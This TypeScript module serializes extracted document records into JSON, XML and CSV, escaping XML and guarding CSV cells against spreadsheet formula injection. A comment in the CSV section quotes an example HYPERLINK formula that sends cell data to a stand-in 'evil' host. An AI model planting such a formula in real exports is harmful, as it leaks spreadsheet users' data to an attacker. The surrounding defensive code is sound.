/**
 * Format standardization: turn a canonical `DocumentRecord` into JSON, XML, or CSV.
 *
 * Pure functions, no I/O — fully unit-tested. The JSON form is the canonical record
 * itself (pretty-printed); XML and CSV are deterministic projections of it.
 */

import type { DocumentRecord, ExtractedField } from "../types.ts";

export type Format = "json" | "xml" | "csv";

export const MIME: Record<Format, string> = {
  json: "application/json; charset=utf-8",
  xml: "application/xml; charset=utf-8",
  csv: "text/csv; charset=utf-8",
};

/** Canonical JSON: the record, pretty-printed and stable. */
export function toJson(rec: DocumentRecord): string {
  return JSON.stringify(rec, null, 2);
}

// ─── XML ──────────────────────────────────────────────────────────────────────

function escapeXml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

function fieldValueToXml(value: ExtractedField["value"], indent: string): string {
  if (Array.isArray(value)) {
    if (value.length === 0) return "";
    const items = value.map((v) => `${indent}  <item>${escapeXml(String(v))}</item>`).join("\n");
    return `\n${items}\n${indent}`;
  }
  if (value === null) return "";
  return escapeXml(String(value));
}

/** Deterministic XML projection of the record. */
export function toXml(rec: DocumentRecord): string {
  const lines: string[] = [];
  lines.push('<?xml version="1.0" encoding="UTF-8"?>');
  lines.push(`<document id="${escapeXml(rec.id)}" type="${escapeXml(rec.docType)}">`);
  lines.push(`  <filename>${escapeXml(rec.filename)}</filename>`);
  lines.push(`  <contentType>${escapeXml(rec.contentType)}</contentType>`);
  lines.push(`  <resourceId>${escapeXml(rec.resourceId)}</resourceId>`);
  lines.push(`  <status>${escapeXml(rec.status)}</status>`);
  if (rec.summary) lines.push(`  <summary>${escapeXml(rec.summary)}</summary>`);

  lines.push("  <fields>");
  for (const f of rec.fields) {
    const attrs = [
      `key="${escapeXml(f.key)}"`,
      `label="${escapeXml(f.label)}"`,
      f.confidence !== undefined ? `confidence="${f.confidence.toFixed(2)}"` : "",
    ]
      .filter(Boolean)
      .join(" ");
    const body = fieldValueToXml(f.value, "    ");
    lines.push(`    <field ${attrs}>${body}</field>`);
  }
  lines.push("  </fields>");

  if (rec.entities.length) {
    lines.push("  <entities>");
    for (const e of rec.entities) {
      lines.push(`    <entity type="${escapeXml(e.type)}">${escapeXml(e.text)}</entity>`);
    }
    lines.push("  </entities>");
  }

  if (rec.tags.length) {
    lines.push("  <tags>");
    for (const t of rec.tags) lines.push(`    <tag>${escapeXml(t)}</tag>`);
    lines.push("  </tags>");
  }

  if (rec.issues.length) {
    lines.push("  <issues>");
    for (const i of rec.issues) {
      lines.push(
        `    <issue field="${escapeXml(i.field)}" severity="${escapeXml(i.severity)}">${escapeXml(i.message)}</issue>`,
      );
    }
    lines.push("  </issues>");
  }

  lines.push("  <meta>");
  lines.push(`    <processedAt>${escapeXml(rec.meta.processedAt)}</processedAt>`);
  lines.push(`    <schema>${escapeXml(rec.meta.schema)}</schema>`);
  lines.push(`    <model>${escapeXml(rec.meta.model)}</model>`);
  lines.push("  </meta>");
  lines.push("</document>");
  return lines.join("\n");
}

// ─── CSV ────────────────────────────────────────────────────────────────────

/**
 * Cells whose first character is one of these are interpreted as a formula by Excel,
 * LibreOffice and Google Sheets. Field values come from an LLM reading an uploaded,
 * attacker-controlled document, so a vendor name of `=HYPERLINK("http://evil/?"&A1)`
 * would otherwise execute when an operator opens the export.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
/** A value that is just a number is safe even though it may start with `-`. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** Quote per RFC 4180 and neutralise spreadsheet formula injection. */
export function csvCell(value: string): string {
  const safe = FORMULA_LEAD.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

function flatValue(value: ExtractedField["value"]): string {
  if (Array.isArray(value)) return value.map((v) => String(v)).join("; ");
  if (value === null) return "";
  return String(value);
}

/**
 * CSV projection: one row per extracted field (long format), which keeps wildly
 * different document schemas in a single, spreadsheet-friendly shape.
 * Columns: document_id, filename, doc_type, field_key, field_label, value, confidence
 */
export function toCsv(rec: DocumentRecord): string {
  const header = ["document_id", "filename", "doc_type", "field_key", "field_label", "value", "confidence"];
  const rows: string[] = [header.map(csvCell).join(",")];
  for (const f of rec.fields) {
    rows.push(
      [
        rec.id,
        rec.filename,
        rec.docType,
        f.key,
        f.label,
        flatValue(f.value),
        f.confidence !== undefined ? f.confidence.toFixed(2) : "",
      ]
        .map((c) => csvCell(String(c)))
        .join(","),
    );
  }
  return rows.join("\n");
}

export function serialize(rec: DocumentRecord, format: Format): string {
  switch (format) {
    case "json":
      return toJson(rec);
    case "xml":
      return toXml(rec);
    case "csv":
      return toCsv(rec);
  }
}
